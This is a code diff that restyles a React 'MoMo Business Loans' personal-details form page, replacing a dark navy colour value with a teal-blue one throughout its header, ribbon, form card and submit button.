@@ -97,7 +97,7 @@ export default function PersonalDetails() {
 
   if (submitting) {
     return (
-      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
+      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
         <Logo size="md" />
         <h2 className="text-2xl font-extrabold tracking-tight">
           MoMo <span className="text-[#ffcc00]">Business Loans</span>
@@ -117,9 +117,9 @@ export default function PersonalDetails() {
 
   return (
     <PageLoader>
-      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col">
+      <div className="min-h-screen bg-[hsl(198,100%,22%)] text-white flex flex-col">
         {/* Top Header */}
-        <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -127,14 +127,14 @@ export default function PersonalDetails() {
                 MoMo <span className="font-normal opacity-90">Business Loans</span>
               </span>
             </div>
-            <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full">
+            <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full">
               Step 2 of 2
             </span>
           </div>
         </header>
 
         {/* Promo Ribbon */}
-        <div className="bg-[hsl(220,40%,20%)] py-3 px-4 border-b border-[hsl(220,30%,25%)]">
+        <div className="bg-[hsl(198,60%,28%)] py-3 px-4 border-b border-[hsl(198,55%,32%)]">
           <div className="container mx-auto max-w-4xl flex items-center justify-center gap-2">
             <p className="text-white text-xs sm:text-sm font-bold text-center">
               ⚡ Get Instant Business Loans Within Minutes From MoMo Today.
@@ -145,7 +145,7 @@ export default function PersonalDetails() {
 
         {/* Main Form Container */}
         <main className="flex-1 container mx-auto max-w-lg px-4 py-8">
-          <div className="bg-white rounded-3xl p-6 sm:p-8 text-[hsl(220,50%,12%)] shadow-2xl border border-gray-100">
+          <div className="bg-white rounded-3xl p-6 sm:p-8 text-[hsl(198,100%,22%)] shadow-2xl border border-gray-100">
             <button
               id="personal-details-back-btn"
               onClick={() => navigate(-1)}
@@ -159,7 +159,7 @@ export default function PersonalDetails() {
               <div className="w-12 h-12 rounded-2xl bg-[#ffcc00]/20 text-[#ffcc00] flex items-center justify-center mx-auto mb-3 border border-[#ffcc00]/30">
                 <UserCheck className="w-6 h-6 text-gray-800" />
               </div>
-              <h2 className="text-2xl font-extrabold tracking-tight text-[hsl(220,50%,12%)]">
+              <h2 className="text-2xl font-extrabold tracking-tight text-[hsl(198,100%,22%)]">
                 Personal Information
               </h2>
               <p className="text-gray-500 text-xs sm:text-sm mt-1">
@@ -171,7 +171,7 @@ export default function PersonalDetails() {
             <div className="bg-gray-50 rounded-2xl p-3.5 border border-gray-200 mb-6 flex items-center justify-between">
               <div>
                 <span className="text-[11px] uppercase font-bold text-gray-400">Applying for</span>
-                <p className="font-extrabold text-sm text-[hsl(220,50%,12%)]">{loanData.amount} ({loanData.repayment})</p>
+                <p className="font-extrabold text-sm text-[hsl(198,100%,22%)]">{loanData.amount} ({loanData.repayment})</p>
               </div>
               <span className="text-xs font-bold bg-[#ffcc00]/20 text-gray-800 px-3 py-1 rounded-xl">
                 {loanData.type}
@@ -272,7 +272,7 @@ export default function PersonalDetails() {
               id="submit-application-btn"
               onClick={handleSubmit}
               disabled={!valid || submitting}
-              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2"
+              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-extrabold text-base hover:bg-[#ffcc00]/90 disabled:opacity-40 transition shadow-md flex items-center justify-center gap-2"
             >
               {submitting ? (
                 <>
